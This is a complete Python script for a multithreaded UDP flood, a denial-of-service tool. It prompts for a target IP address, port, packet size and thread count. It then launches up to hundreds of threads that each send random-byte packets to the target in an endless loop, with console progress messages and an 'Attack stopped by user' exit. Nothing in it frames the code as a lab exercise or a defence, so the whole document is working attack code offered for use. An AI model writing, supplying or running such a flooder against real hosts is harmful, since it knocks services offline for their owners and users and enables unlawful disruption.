import socket
import random
import threading
import os
import time

def udp_flood(ip: str, port: int, packet_size: int, thread_id: int):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = random._urandom(packet_size)
    sent = 0
    while True:
        try:
            sock.sendto(packet, (ip, port))
            sent += 1
            if sent % 10000 == 0:
                print(f"[Thread {thread_id}] Sent {sent} packets to {ip}:{port}")
        except Exception as e:
            print(f"[Thread {thread_id}] Error: {e}")
            break

def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    ip = input("Target IP: ").strip()
    port = int(input("Target Port: ").strip())
    packet_size = int(input("Packet Size (e.g., 1024-65500): ").strip())
    thread_count = int(input("Number of Threads (e.g., 10-500): ").strip())

    print(f"\nStarting flood on {ip}:{port} with {thread_count} threads...\n")
    time.sleep(1)

    threads = []
    try:
        for i in range(thread_count):
            t = threading.Thread(target=udp_flood, args=(ip, port, packet_size, i + 1), daemon=True)
            t.start()
            threads.append(t)

        # Keep main thread alive
        while True:
            time.sleep(1)

    except KeyboardInterrupt:
        print("\nAttack stopped by user.")
        os._exit(0)

if __name__ == "__main__":
    main()